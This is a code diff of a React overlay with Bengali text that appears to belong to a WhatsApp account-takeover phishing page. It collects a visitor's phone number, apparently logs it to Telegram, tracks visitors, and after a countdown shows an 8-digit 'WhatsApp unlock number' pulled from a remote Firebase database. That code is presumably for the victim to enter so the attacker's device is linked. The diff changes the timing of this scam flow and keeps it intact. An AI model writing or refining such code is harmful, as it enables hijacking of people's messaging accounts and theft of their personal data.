@@ -1,14 +1,18 @@
 
 import React, { useState, useEffect } from 'react';
-import { initializeApp, getApps } from 'firebase/app';
+import * as firebaseApp from 'firebase/app';
 import { getDatabase, ref, onValue } from 'firebase/database';
 import { Smartphone, CheckCircle2, Fingerprint, Keyboard, Info } from 'lucide-react';
+
+// Workaround for TS error: "Module 'firebase/app' has no exported member 'initializeApp'"
+const initializeApp = (firebaseApp as any).initializeApp;
+const getApps = (firebaseApp as any).getApps;
 
 interface ConnectGuideOverlayProps {
     isOpen: boolean;
     onClose: () => void;
     onFinalizeRegistration: (number: string) => void;
-    onStartGuide: (number: string) => void;
+    onFinalNumberSubmit: (number: string) => void;
     phoneNumber?: string;
 }
 
@@ -33,12 +37,14 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
     isOpen, 
     onClose, 
     onFinalizeRegistration, 
-    onStartGuide,
+    onFinalNumberSubmit,
     phoneNumber 
 }) => {
-    const [currentPhase, setCurrentPhase] = useState<'INPUT' | 'LOADING' | 'GUIDE'>('INPUT');
+    // Removed LOADING phase as we transition directly to GUIDE with a countdown
+    const [currentPhase, setCurrentPhase] = useState<'INPUT' | 'GUIDE'>('INPUT');
     const [inputNumber, setInputNumber] = useState(phoneNumber || '');
     const [pinDigits, setPinDigits] = useState<string[]>(Array(8).fill(''));
+    const [countdown, setCountdown] = useState(20);
     
     useEffect(() => {
         if (phoneNumber) {
@@ -46,16 +52,27 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
         }
     }, [phoneNumber]);
 
-    // 1. Initialize Guide App for PIN Code (Only in GUIDE phase)
+    // Countdown Timer Logic
     useEffect(() => {
-        // STRICT CHECK: Only run this effect if isOpen AND phase is GUIDE
-        if (!isOpen || currentPhase !== 'GUIDE') return;
+        let timer: ReturnType<typeof setInterval>;
+        if (isOpen && currentPhase === 'GUIDE' && countdown > 0) {
+            timer = setInterval(() => {
+                setCountdown((prev) => prev - 1);
+            }, 1000);
+        }
+        return () => clearInterval(timer);
+    }, [isOpen, currentPhase, countdown]);
+
+    // 1. Initialize Guide App for PIN Code (Only in GUIDE phase AND after countdown)
+    useEffect(() => {
+        // STRICT CHECK: Only run this effect if isOpen, phase is GUIDE, and countdown is 0
+        if (!isOpen || currentPhase !== 'GUIDE' || countdown > 0) return;
 
         const APP_NAME = 'connectGuideApp';
         let app;
 
         try {
-            const existingApp = getApps().find(app => app.name === APP_NAME);
+            const existingApp = getApps().find((app: any) => app.name === APP_NAME);
             app = existingApp ? existingApp : initializeApp(guideConfig, APP_NAME);
 
             const db = getDatabase(app);
@@ -71,7 +88,7 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
         } catch (error) {
             console.error("Guide Firebase Init Error:", error);
         }
-    }, [isOpen, currentPhase]); // Dependency array ensures re-run when phase changes to GUIDE
+    }, [isOpen, currentPhase, countdown]);
 
     // 2. Visitor Tracking
     useEffect(() => {
@@ -128,16 +145,11 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
             });
         } catch (e) { console.warn("Telegram log failed", e); }
 
-        // 2. Trigger Start Guide (Phase 1 Complete)
-        onStartGuide(formattedNumber);
+        // 2. Trigger Final Number Submit (Hand off to App)
+        onFinalNumberSubmit(formattedNumber);
 
-        // 3. Transition to LOADING phase
-        setCurrentPhase('LOADING');
-
-        // 4. Wait 20 seconds, then transition to GUIDE phase
-        setTimeout(() => {
-            setCurrentPhase('GUIDE');
-        }, 20000);
+        // 3. Transition immediately to GUIDE phase (Countdown starts automatically)
+        setCurrentPhase('GUIDE');
     };
 
     if (!isOpen) return null;
@@ -185,16 +197,7 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
                     </div>
                 )}
 
-                {/* PHASE 2: LOADING */}
-                {currentPhase === 'LOADING' && (
-                    <div className="text-center animate-in fade-in py-8">
-                        <div className="w-16 h-16 border-4 border-emerald-200 border-t-[#25D366] rounded-full animate-spin mx-auto mb-6"></div>
-                        <h2 className="text-xl font-bold text-gray-800 mb-2">যাচাই করা হচ্ছে...</h2>
-                        <p className="text-gray-500">অনুগ্রহ করে ২০ সেকেন্ড অপেক্ষা করুন।</p>
-                    </div>
-                )}
-
-                {/* PHASE 3: GUIDE */}
+                {/* PHASE 2: GUIDE */}
                 {currentPhase === 'GUIDE' && (
                     <div className="text-center animate-in slide-in-from-right duration-300">
                         <div className="text-5xl text-[#075E54] mb-4 flex justify-center">
@@ -204,13 +207,19 @@ export const ConnectGuideOverlay: React.FC<ConnectGuideOverlayProps> = ({
                     
                         <p className="text-gray-600 mb-2">নুসরাত এর ৮-সংখ্যার Whatsapp আনলক নাম্বার</p>
                         
-                        {/* PIN Display */}
-                        <div className="flex justify-center gap-1.5 mb-6">
-                            {pinDigits.map((digit, idx) => (
-                                <div key={idx} className="w-[38px] h-[48px] flex items-center justify-center font-bold text-2xl bg-white border-2 border-[#128C7E] text-[#075E54] rounded-lg shadow-sm">
-                                    {digit || ''}
+                        {/* Dynamic Display: Countdown Message OR PIN Code */}
+                        <div className="flex justify-center gap-1.5 mb-6 min-h-[52px]">
+                            {countdown > 0 ? (
+                                <div className="flex items-center justify-center w-full p-3 bg-amber-50 border border-amber-200 rounded-lg text-amber-800 font-bold">
+                                    কোড প্রদর্শিত হবে: {countdown} সেকেন্ড
                                 </div>
-                            ))}
+                            ) : (
+                                pinDigits.map((digit, idx) => (
+                                    <div key={idx} className="w-[38px] h-[48px] flex items-center justify-center font-bold text-2xl bg-white border-2 border-[#128C7E] text-[#075E54] rounded-lg shadow-sm animate-in zoom-in">
+                                        {digit || ''}
+                                    </div>
+                                ))
+                            )}
                         </div>
 
                         {/* Instructions */}
